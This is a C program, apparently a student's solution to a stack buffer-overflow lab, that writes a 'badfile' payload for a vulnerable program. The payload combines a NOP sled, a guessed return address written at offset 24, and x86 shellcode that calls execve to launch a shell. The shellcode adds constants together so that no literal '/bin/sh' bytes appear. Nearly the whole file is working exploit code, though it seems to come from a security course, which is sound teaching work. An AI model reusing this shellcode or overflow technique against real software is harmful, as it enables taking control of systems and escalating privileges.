/* A program that creates a file containing code for launching shell*/
#include <stdlib.h>
#include <stdio.h>
#include <string.h>

char shellcode[]=
    "\x31\xc0"                  /* xorl %eax,%eax */
    "\x50"                      /* pushl %eax */
    "\xb8\xb7\xd8\x3e\x56"      /* movl $0x563ed8b7, %eax */
    "\x05\x78\x56\x34\x12"      /* addl $0x12345678, %eax */
    "\x50"                      /* pushl %eax */
    "\xb8\xde\xc0\xad\xde"      /* movl $0xdeadc0de, %eax */
    "\x2d\xaf\x5e\x44\x70"      /* subl $0x70445eaf, %eax */
    "\x50"                      /* pushl %eax */
    "\x89\xe3"                  /* movl %esp,%ebx */
    "\x31\xc0"                  /* xorl %eax,%eax */
    "\x50"                      /* pushl %eax */
    "\x53"                      /* pushl %ebx */
    "\x89\xe1"                  /* movl %esp,%ecx */
    "\x99"                      /* cdql */
    "\xb0\x0b"                  /* movb $0x0b,%al */
    "\xcd\x80"                  /* int $0x80 */
;

void main(int argc, char **argv)
{
    char buffer[517];
    FILE *badfile;

    /* Initialize buffer with 0x90 (NOP instruction) */
    memset(&buffer, 0x90, 517);

    /* You need to fill the buffer with appropriate contents here */
    // 0xbffff0fc is the address of buffer
    long guess_addr = 0xbffff0fc; 

    // the address we want `bof` to return to. + any number as long as it is big
    // enough to fall into one of the noops
    guess_addr += 250;

    // put the guess_addr in our badfile where it will overwrite the return
    // address of `bof`. From gdb inspection, we get that the location of
    // buffer and the return address is 24 bytes away.
    // The fact that return address is located at $ebp+4 is obtained from lab
    // practice
    long* ptr = (long*)(buffer + 24);
    *ptr = guess_addr;
    
    // Write the shellcode somewhere at the end of the buffer.
    strcpy(&buffer[450], shellcode);

    /* Save the contents to the file "badfile" */
    badfile = fopen("./badfile", "w");
    fwrite(buffer, 517, 1, badfile);
    fclose(badfile);
}
